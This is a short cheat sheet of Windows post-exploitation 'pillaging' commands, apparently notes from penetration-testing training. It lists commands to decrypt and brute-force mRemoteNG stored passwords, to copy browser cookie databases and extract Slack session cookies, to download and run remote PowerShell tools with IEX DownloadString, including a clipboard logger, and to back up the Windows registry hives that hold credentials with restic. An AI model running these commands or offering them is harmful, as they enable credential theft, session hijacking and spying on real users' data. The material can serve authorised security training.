# Pillaging

## Installed Applications

```powershell
dir "C:\Program Files"
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName,DisplayVersion,InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName,DisplayVersion,InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | Sort-Object DisplayName -Unique | Format-Table -AutoSize
```

---

## mRemoteNG

```bash
ls C:\Users\julio\AppData\Roaming\mRemoteNG
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig=="
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin
for password in $(cat /usr/share/wordlists/fasttrack.txt); do
    python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null
done
```

---

## Abusing Cookies (Slack - Firefox)

```powershell
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
python3 cookieextractor.py --dbpath "./cookies.sqlite" --host slack --cookie d
```

---

## Abusing Cookies (Slack - Chrome)

```powershell
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
Invoke-SharpChromium -Command "cookies slack.com"
```

---

## Clipboard

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
```

---

## Attacking Backup Servers (restic)

```powershell
mkdir E:\restic2
restic.exe -r E:\restic2 init
$env:RESTIC_PASSWORD = 'Password'
restic.exe -r E:\restic2 backup C:\SampleFolder
restic.exe -r E:\restic2 backup C:\Windows\System32\config --use-fs-snapshot
restic.exe -r E:\restic2 snapshots
restic.exe -r E:\restic2 restore 9971e881 --target C:\Restore
```
